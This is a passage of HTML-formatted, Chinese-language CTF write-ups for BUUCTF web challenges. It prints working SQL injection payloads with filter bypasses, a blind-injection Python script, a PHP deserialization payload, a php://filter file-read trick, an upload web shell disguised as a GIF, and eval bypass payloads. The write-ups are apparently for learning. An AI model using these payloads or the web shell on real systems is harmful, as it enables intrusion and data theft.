class="token number">3</span> from <span class="token string backtick-quoted-string">`l0ve1ysq1`</span><span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">111</span></code></pre><h4 id="BabySQL-ÂèåÂÜôÁªïËøá"><a href="#BabySQL-ÂèåÂÜôÁªïËøá" class="headerlink" title="BabySQL(ÂèåÂÜôÁªïËøá)"></a>BabySQL(ÂèåÂÜôÁªïËøá)</h4><p>ÁôªÂΩïÊ°ÜÔºåÂ∞ùËØïÊµãËØïÊ≥®ÂÖ•ÁÇπ</p><p><img src="babysql.png" loading="lazy"></p><p>ÂèëÁé∞Êä•Èîô‰∫ÜÔºåÂπ∂‰∏îËøîÂõûÁöÑÊ≤°ÊúâËæìÂÖ•ÁöÑ<code>or</code>‰∫éÊòØÁåúÊµãË¢´ÊõøÊç¢‰∏∫Á©∫Ê†º‰∫ÜÔºåÂ∞ùËØïÂèåÂÜôÁªïËøá</p><p><img src="babysql_2.png" loading="lazy"></p><pre class="language-sql" data-language="sql"><code class="language-sql">?username<span class="token operator">=</span>a<span class="token string">'+oorr+1=1#&amp;password=a'</span><span class="token operator">+</span>oorr<span class="token operator">+</span><span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token comment">#</span></code></pre><p><img src="babysql_3.png" loading="lazy"></p><p>‰∏ãÊù•Â∞±ÊòØÂ∏∏ËßÑÊ≥®ÂÖ•ÊµÅÁ®ã</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>username<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token string single-quoted-string">' uniunionon selselectect 1,2,3%23&amp;password=111# Êü•Ë°®Âêç b4bsql,geekuser?username=admin&amp;password=111'</span> uniunionon selselectect <span class="token number">1</span><span class="token punctuation">,</span><span class="token function">group_concat</span><span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span> ffromrom infoorrmation_schema<span class="token operator">.</span>tables whwhereere table_schema<span class="token operator">=</span><span class="token function">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span><span class="token comment"># Êü•Â∫ìÂêç id,username,password</span><span class="token operator">?</span>username<span class="token operator">=</span>admin<span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">111</span><span class="token string single-quoted-string">' uniunionon selselectect 1,group_concat(column_name),3 ffromrom infoorrmation_schema.columns whwhereere table_name='</span>b4bsql<span class="token string single-quoted-string">'%23# getFlag?username=admin&amp;password=111'</span> ununionion selselectect <span class="token number">1</span><span class="token punctuation">,</span><span class="token function">group_concat</span><span class="token punctuation">(</span>id<span class="token punctuation">,</span>username<span class="token punctuation">,</span>passwoorrd<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span> ffromrom <span class="token string backtick-quoted-string">`b4bsql`</span><span class="token operator">%</span><span class="token number">23</span></code></pre><h4 id="HardSQL-Êä•ÈîôÊ≥®ÂÖ•"><a href="#HardSQL-Êä•ÈîôÊ≥®ÂÖ•" class="headerlink" title="HardSQL(Êä•ÈîôÊ≥®ÂÖ•)"></a>HardSQL(Êä•ÈîôÊ≥®ÂÖ•)</h4><p>fuzzÊµãËØïËøáÊª§‰∫ÜÂ•ΩÂ§öÔºå‰∏ªË¶ÅÊòØÁ©∫Ê†ºÂíå&#x3D;Ë¢´ËøáÊª§‰∫ÜÔºåÂèØ‰ª•Áî®<code>()</code>ÁªïËøá</p><p>emÁúã‰∫ÜwpËØ¥ÊòØÊä•ÈîôÊ≥®ÂÖ•</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment"># Êï∞ÊçÆÂ∫ì geek</span><span class="token operator">?</span>username<span class="token operator">=</span>admin<span class="token string single-quoted-string">'or(updatexml(1,concat(0x7e,database(),0x7e),1))#&amp;password=11# Êü•Ë°®Âêç H4rDsq1?username=admin'</span><span class="token keyword">or</span><span class="token punctuation">(</span><span class="token function">updatexml</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token function">select</span><span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token function">from</span><span class="token punctuation">(</span>information_schema<span class="token operator">.</span>tables<span class="token punctuation">)</span><span class="token function">where</span><span class="token punctuation">(</span>table_schema<span class="token punctuation">)</span><span class="token function">like</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'geek'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">11</span><span class="token comment"># Êü•Â∫ìÂêç id,username,password</span><span class="token operator">?</span>username<span class="token operator">=</span>admin<span class="token string single-quoted-string">'or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('</span>H4rDsq1<span class="token string single-quoted-string">')),0x7e),1))%23&amp;password=11# getFlag ËøôÈáåÂè™ËÉΩÂæóÂà∞‰∏ÄÂçäflag?username=admin'</span><span class="token keyword">or</span><span class="token punctuation">(</span><span class="token function">updatexml</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token function">select</span><span class="token punctuation">(</span><span class="token function">group_concat</span><span class="token punctuation">(</span>id<span class="token punctuation">,</span>username<span class="token punctuation">,</span>password<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token function">from</span><span class="token punctuation">(</span><span class="token string backtick-quoted-string">`H4rDsq1`</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">11</span> <span class="token operator">?</span>username<span class="token operator">=</span>admin'<span class="token keyword">or</span><span class="token punctuation">(</span><span class="token function">updatexml</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token function">select</span><span class="token punctuation">(</span><span class="token function">right</span><span class="token punctuation">(</span>password<span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token function">from</span><span class="token punctuation">(</span><span class="token string backtick-quoted-string">`H4rDsq1`</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span><span class="token operator">&amp;</span>password<span class="token operator">=</span><span class="token number">11</span></code></pre><h4 id="FinalSQL-1-1-1"><a href="#FinalSQL-1-1-1" class="headerlink" title="FinalSQL(1^1^1)"></a>FinalSQL(1^1^1)</h4><p><img src="finalsql.png" loading="lazy"></p><p>‰∏äÈù¢Âá†‰∏™ÈÄâÈ°πÈÉΩÊ≤°Âï•Áî®Ôºå‰ΩÜÊòØ‰ºöget‰∏Ä‰∏™idÂèÇÊï∞</p><p>fuzzÊµãËØï‰∫Ü‰∏Ä‰∏ãÔºåusernameÊã¨Âè∑‰πüban‰∫ÜÔºå‰ΩÜÊòØidÂèÇÊï∞ÊúâÂ•ΩÂ§öÔºå‰ΩÜÊòØÊ≤°ÂõûÊòæÔºå‰º∞ËÆ°ÊòØË¶ÅÁõ≤Ê≥®‰∫Ü</p><p>ËøôÈáå‰ΩøÁî®ÂºÇÊàñÊìç‰ΩúÊù•ËøõË°åÊ≥®ÂÖ•Ôºå<code>1^1=0</code>,<code>0^0=0</code>,<code>1^0=1</code></p><p><code>1^1^1=1</code>  <code>1^0^1=0</code></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://23fa8212-e443-4df3-bf88-16bb8561a454.node5.buuoj.cn:81/search.php"</span>i <span class="token operator">=</span> <span class="token number">0</span>flag <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    head <span class="token operator">=</span> <span class="token number">32</span>    tail <span class="token operator">=</span> <span class="token number">127</span>    i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>    <span class="token keyword">while</span> head <span class="token operator">&lt;</span> tail<span class="token punctuation">:</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>head <span class="token operator">+</span> tail<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>        <span class="token comment"># Êü•Ë°®Âêç F1naI1y,Flaaaaag</span>        <span class="token comment"># payload = "select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())"</span>        <span class="token comment"># Êü•Â∫ìÂêç id,username,password</span>        <span class="token comment"># payload = "select(group_concat(column_name))from(information_schema.columns)where(table_name='F1naI1y')"</span>        <span class="token comment"># getFlag</span>        payload <span class="token operator">=</span> <span class="token string">"select(group_concat(id,username,password))from(F1naI1y)"</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">"id"</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"1^(ascii(substr((</span><span class="token interpolation"><span class="token punctuation">&#123;</span>payload<span class="token punctuation">&#125;</span></span><span class="token string">),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))></span><span class="token interpolation"><span class="token punctuation">&#123;</span>mid<span class="token punctuation">&#125;</span></span><span class="token string">)^1"</span></span>        <span class="token punctuation">&#125;</span>        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> params<span class="token operator">=</span>data<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">"Click"</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            head <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            tail <span class="token operator">=</span> mid    <span class="token keyword">if</span> head <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+] &#123;&#125; is right"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">break</span></code></pre><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span>mygodcl4y_is_really_amazing<span class="token punctuation">,</span><span class="token number">2</span>welcomewelcome_to_my_blog<span class="token punctuation">,</span><span class="token number">3</span>sitehttp:<span class="token comment">//www.cl4y.top,</span><span class="token number">4</span>sitehttp:<span class="token comment">//www.cl4y.top,</span><span class="token number">5</span>sitehttp:<span class="token comment">//www.cl4y.top,</span><span class="token number">6</span>sitehttp:<span class="token comment">//www.cl4y.top,</span><span class="token number">7</span>Sycwelcom_to_Syclover<span class="token punctuation">,</span><span class="token number">8</span>finallycl4y_really_need_a_grilfriend<span class="token punctuation">,</span><span class="token number">9</span>flagflag&#123;<span class="token number">59</span>f87dfd<span class="token operator">-</span>c778<span class="token operator">-</span><span class="token number">496</span>d<span class="token operator">-</span><span class="token number">8</span>cf6<span class="token operator">-</span><span class="token number">4349</span>ce4d8e1c&#125;</code></pre><h4 id="BuyFlag-strcmp"><a href="#BuyFlag-strcmp" class="headerlink" title="BuyFlag(strcmp)"></a>BuyFlag(strcmp)</h4><p><img src="buyflag.png" loading="lazy"></p><p>ÁúãÊ†∑Â≠êË¶ÅÊîπcookie</p><p>ÂÖàÊäì‰∏™ÂåÖÁúãÁúã</p><p><img src="buyflag_2.png" loading="lazy"></p><p>userÊîπÊàê1ËØïËØïÔºåÂèëÁé∞ÊàêÂäü</p><pre class="language-markup" data-language="markup"><code class="language-markup">you are CuiterPlease input your password!!</code></pre><p>ÁÑ∂ÂêéÊ∫êÁ†ÅÁªô‰∫ÜÊèêÁ§∫</p><pre class="language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">&lt;!--~~~post money and password~~~if (isset($_POST[&#39;password&#39;])) &#123;$password &#x3D; $_POST[&#39;password&#39;];if (is_numeric($password)) &#123;echo &quot;password can&#39;t be number&lt;&#x2F;br&gt;&quot;;&#125;elseif ($password &#x3D;&#x3D; 404) &#123;echo &quot;Password Right!&lt;&#x2F;br&gt;&quot;;&#125;&#125;--&gt;</code></pre><p>Âõ†‰∏∫ÊòØÂº±ÊØîËæÉÊâÄ‰ª•ÂèëÈÄÅ404aÂç≥ÂèØÔºåËøôÊ†∑Âç≥ÂèØgetFlag</p><p>ÊèêÁ§∫Êï∞Â≠óÈïøÂ∫¶Â§™Èïø‰∫ÜÔºåÈúÄË¶Å‰øÆÊîπÔºå‰∏§ÁßçÊñπÊ≥ï</p><ul><li>money&#x3D;1e9</li><li>money[]&#x3D;1 strcmpÂáΩÊï∞ÁâπÊÄß</li></ul><p><strong>strcmp</strong>ÂáΩÊï∞Âú®ËøõË°åÂØπÊØîÔºåÂ¶ÇÊûúÁõ∏ÂêåËøîÂõû0‰∏çÁõ∏ÂêåËøîÂõûÈùû0„ÄÇÂÆÉÊòØ‰∏Ä‰∏™PHPÂº±Á±ªÂûãÔºåËøô‰∏™ÂáΩÊï∞ÊØîËæÉÁöÑÊòØÂ≠óÁ¨¶‰∏≤Á±ªÂûãÔºåÂ¶ÇÊûúÂº∫Ë°å‰º†ÂÖ•ÂÖ∂‰ªñÂèÇÊï∞Â∞±‰ºöÂá∫ÈîôÔºåÂá∫ÈîôÂêéËøîÂõû0ÔºåËøîÂõû0Â∞±ÂèØ‰ª•ÁªïËøáÁõ¥Êé•ÁôªÂΩï‰∫Ü„ÄÇ</p><h4 id="Havefun"><a href="#Havefun" class="headerlink" title="Havefun"></a>Havefun</h4><p>Ê∫êÁ†ÅÊúâÊèêÁ§∫</p><pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token comment">&lt;!--        $cat=$_GET['cat'];        echo $cat;        if($cat=='dog')&#123;            echo 'Syc&#123;cat_cat_cat_cat&#125;';        &#125;        --></span></code></pre><p>Á≠æÂà∞È¢ò?cat&#x3D;dog</p><h4 id="Http"><a href="#Http" class="headerlink" title="Http"></a>Http</h4><p>Ê∫êÁ†Å‚ÄùSecret.php‚Äù</p><pre class="language-http" data-language="http"><code class="language-http"># It doesn't come from 'https://Sycsecret.buuoj.cn'<span class="token header"><span class="token header-name keyword">Referer</span><span class="token punctuation">:</span> <span class="token header-value">https://Sycsecret.buuoj.cn</span></span># Please use "Syclover" browser<span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Syclover</span></span># No!!! you can only read this locally!!!<span class="token header"><span class="token header-name keyword">X-Forwarded-For</span><span class="token punctuation">:</span> <span class="token header-value">127.0.0.1</span></span></code></pre><h4 id="Knife"><a href="#Knife" class="headerlink" title="Knife"></a>Knife</h4><p>ÊàëÂÆ∂ËèúÂàÄ‰∏¢‰∫ÜÔºå‰Ω†ËÉΩÂ∏ÆÊàëÊâæ‰∏Ä‰∏ã‰πà</p><p>eval($_POST[‚ÄúSyc‚Äù]);</p><p>Áõ¥Êé•ËöÅÂâëËøûÊé•</p><h4 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h4><p><img src="php.png" loading="lazy"></p><p>ÁúãÂà∞ÊèêÁ§∫ÔºöÂ§á‰ªΩÊñá‰ª∂</p><p>Êâ´Êèè‰∏ãËΩΩ<code>www.zip</code></p><pre class="language-php" data-language="php"><code class="language-php"># index.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token keyword">include</span> <span class="token string single-quoted-string">'class.php'</span><span class="token punctuation">;</span>    <span class="token variable">$select</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'select'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$res</span><span class="token operator">=</span><span class="token function">unserialize</span><span class="token punctuation">(</span>@<span class="token variable">$select</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token delimiter important">?></span></span></code></pre><pre class="language-php" data-language="php"><code class="language-php"># class.php<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span> <span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Name</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'nonono'</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'yesyes'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token variable">$username</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span> <span class="token operator">=</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'guest'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span> <span class="token operator">!=</span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>NO!!!hacker!!!&lt;/br>"</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"You name is: "</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"You password is: "</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'admin'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">global</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>hello my friend~~&lt;/br>sorry i can't give you the flag!"</span><span class="token punctuation">;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>Âè™ÈúÄË¶ÅÊª°Ë∂≥<code>username=admin</code>Âíå<code>password=100</code>Âç≥ÂèØÔºåÂè¶Â§ñË¶ÅÊ≥®ÊÑèÁªïËøá__wakeup()Ôºå‰øÆÊîπÂ±ûÊÄßÊï∞Âç≥ÂèØ(‚ÄúName‚Äù:2 -&gt; ‚ÄúName‚Äù:3)</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">O</span><span class="token operator">%</span><span class="token number">3</span>A4<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>Name<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A3<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A14<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span>Name<span class="token operator">%</span><span class="token number">00</span>username<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A5<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>admin<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A14<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">00</span>Name<span class="token operator">%</span><span class="token number">00</span>password<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A3<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22100</span><span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">7</span>D<span class="token comment"># O:4:"Name":3:&#123;s:14:"Nameusername";s:5:"admin";s:14:"Namepassword";s:3:"100";&#125;</span></code></pre><h4 id="Secret-File"><a href="#Secret-File" class="headerlink" title="Secret File"></a>Secret File</h4><p>Ê†πÊçÆÊ∫êÁ†ÅÊèêÁ§∫(secr3t.php)ÈúÄË¶ÅÊäìÂåÖËé∑ÂèñÔºåÂõ†‰∏∫‰ºö302Ë∑≥ËΩ¨</p><p>ËÆøÈóÆÂæóÂà∞Ê∫êÁ†Å</p><pre class="language-php+HTML" data-language="php+HTML"><code class="language-php+HTML"># secr3t.php&lt;html&gt;    &lt;title&gt;secret&lt;&#x2F;title&gt;    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;&lt;?php    highlight_file(__FILE__);    error_reporting(0);    $file&#x3D;$_GET[&#39;file&#39;];    if(strstr($file,&quot;..&#x2F;&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123;        echo &quot;Oh no!&quot;;        exit();    &#125;    include($file); &#x2F;&#x2F;flagÊîæÂú®‰∫Üflag.phpÈáå?&gt;&lt;&#x2F;html&gt;</code></pre><p>Payload: <code>?file=php://filter/convert.base64-encode/resource=flag.php</code></p><h4 id="Upload"><a href="#Upload" class="headerlink" title="Upload"></a>Upload</h4><p>Ë¶ÅÊ±Ç‰∏ä‰º†ÂõæÁâáÔºåÂØπÊñá‰ª∂ÂêçÂêéÁºÄÊúâ‰∏Ä‰∫õÈôêÂà∂ÔºåÂèØ‰ª•Áî®phtmlÁªïËøáÔºå‰ΩÜÊòØË¶ÅÊ±ÇÊñá‰ª∂Âêç‰∏çËÉΩÊúâ<code>&lt;?</code>Ëøô‰∏™ÂèØ‰ª•Áî®jsÊ†ºÂºèÁªïËøá</p><p>ÊúÄÂêéÁöÑÈôêÂà∂ÊòØ<code>Not Image</code>Ëøô‰∏™ÂèØÂú®Êñá‰ª∂Ê∑ªÂä†Êñá‰ª∂Â§¥GIF89aÁªïËøá</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token number">1</span><span class="token punctuation">.</span>phtmlGIF89a<span class="token operator">&lt;</span>script language<span class="token operator">=</span><span class="token string">"php"</span><span class="token operator">></span>@<span class="token function">eval</span><span class="token punctuation">(</span>$_POST<span class="token punctuation">[</span><span class="token string">'shell'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><p>‰∏ä‰º†ÊàêÂäüÂêéËÆøÈóÆ<code>/upload/</code>ÁÑ∂ÂêéËøõË°årceÂç≥ÂèØ</p><h4 id="RCE-ME-ÂºÇÊàñ-ÂèñÂèç"><a href="#RCE-ME-ÂºÇÊàñ-ÂèñÂèç" class="headerlink" title="RCE ME(ÂºÇÊàñ ÂèñÂèç)"></a>RCE ME(ÂºÇÊàñ ÂèñÂèç)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$code</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                                        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"This is too Long."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                                <span class="token punctuation">&#125;</span>                    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[A-Za-z0-9]+/"</span><span class="token punctuation">,</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                                        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"NO."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                                <span class="token punctuation">&#125;</span>                    @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// </span><span class="token delimiter important">?></span></span></code></pre><p>ËøôÈáå‰ΩøÁî®ÂèñÂèçÔºåÂÖàÁúã‰∏Ä‰∏ãphpinfo</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$funcation</span> <span class="token operator">=</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token string single-quoted-string">'phpinfo'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$payload</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"(~<span class="token interpolation"><span class="token variable">$funcation</span></span>)(~<span class="token interpolation"><span class="token variable">$cmd</span></span>)"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$payload</span><span class="token punctuation">;</span></span></code></pre><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>code<span class="token operator">=</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token operator">%</span><span class="token number">8</span>F<span class="token operator">%</span><span class="token number">97</span><span class="token operator">%</span><span class="token number">8</span>F<span class="token operator">%</span><span class="token number">96</span><span class="token operator">%</span><span class="token number">91</span><span class="token operator">%</span><span class="token number">99</span><span class="token operator">%</span><span class="token number">90</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><img src="rceme.png" loading="lazy"></p><p>ÁúãÂà∞Á¶Å‰∫ÜÂæàÂ§öÂáΩÊï∞<code>system,exec,shell_exec,popen</code></p><p>ËøôÈáåÂèØ‰ª•Áî®<code>assert</code></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter 